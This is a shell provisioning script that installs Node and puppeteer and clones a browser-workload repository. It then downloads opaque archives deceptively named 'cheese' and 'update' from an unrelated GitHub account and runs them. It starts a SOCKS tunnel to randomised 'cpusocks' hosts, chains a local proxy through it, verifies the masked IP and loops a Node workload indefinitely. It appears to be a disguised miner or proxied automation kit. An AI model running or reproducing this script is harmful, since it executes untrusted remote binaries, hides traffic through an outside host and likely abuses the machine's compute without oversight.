#!/bin/sh
apt update;apt -y install python python3 python3-pip libasound2 libnss3-dev libgdk-pixbuf2.0-dev libgtk-3-dev libxss-dev git net-tools apt-utils psmisc libreadline-dev dialog curl wget nano python-pip
apt -y install ca-certificates fonts-liberation libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 lsb-release wget xdg-utils

pip install scipy pandas numpy shiny

wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash && \

sleep 2 && \

source ~/.bashrc && \

sleep 2 && \

nvm install 21.6.1 && \

sleep 2 && \

npm && \

sleep 2 && \

npm install -g npm@10.4.0


npm install puppeteer

git clone https://github.com/ongamfuramfura/browser-workload-nodejs.git

cd browser-workload-nodejs

wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/cheese.tar.gz > /dev/null

sleep 2

tar -xf cheese.tar.gz

sleep 2

./cheese client -v cpusocks$(shuf -i 2-6 -n 1).wot.mrface.com:80 7777:socks &

sleep 2

curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null

tar -xf update.tar.gz

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:7777
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update curl ifconfig.me

sleep 2

cat > automation.sh <<END
while true
do
./update/update node index.js
sleep 5
done
END

chmod +x automation.sh

ls

./automation.sh

